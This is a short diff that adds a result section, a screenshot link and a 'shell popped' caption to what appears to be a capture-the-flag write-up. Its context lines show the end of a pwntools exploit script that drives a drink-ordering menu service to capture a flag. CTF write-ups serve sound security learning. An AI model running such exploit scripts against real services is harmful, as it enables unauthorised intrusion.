@@ -60,3 +60,7 @@ r.sendlineafter(b"How many drinks do you want? ", b"1")
 # Step 3: Exit and capture the flag output
 r.sendlineafter(b"Select a drink: ", b"11")
 print(r.recvall().decode())
+
+## 0x06: Result
+![PoC](./screenshot.jpg)
+*Payload delivered. Shell popped. Mission accomplished.*
